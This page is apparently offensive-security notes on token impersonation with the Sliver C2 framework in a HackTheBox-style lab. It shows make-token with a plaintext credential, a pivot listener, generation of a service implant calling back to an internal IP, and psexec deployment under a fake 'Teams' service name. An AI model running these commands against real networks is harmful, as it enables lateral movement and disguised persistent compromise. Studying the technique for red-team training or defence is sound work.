---
description: Changing our current access token.
---

# Impersonation

With impersonation we can change our access token of the user we run as to another user, like doing with Runas. Sliver has the make-token command which will make a new token.

### Impersonation

```sh
# Impersonate
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Pivot listener
pivots tcp --bind 172.16.1.11

# Create implant
generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# Upload and run file with psexec
psexec --custom-exe /home/kali/sliver/psexec-pivot2.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```

```sh
sliver > help make-token

Command: make-token -u USERNAME -d DOMAIN -p PASSWORD
About: Creates a new Logon Session from the specified credentials and impersonate the resulting token.
You can specify a custon Logon Type using the --logon-type flag, which defaults to LOGON32_LOGON_NEW_CREDENTIALS.
Valid types are:

LOGON_INTERACTIVE
LOGON_NETWORK
LOGON_BATCH
LOGON_SERVICE
LOGON_UNLOCK
LOGON_NETWORK_CLEARTEXT
LOGON_NEW_CREDENTIALS


Usage:
======
  make-token [flags]

Flags:
======
  -d, --domain     string    domain of the user to impersonate
  -h, --help                 display help
  -T, --logon-type string    logon type to use (default: LOGON_NEW_CREDENTIALS)
  -p, --password   string    password of the user to impersonate
  -t, --timeout    int       command timeout in seconds (default: 60)
  -u, --username   string    username of the user to impersonate
```

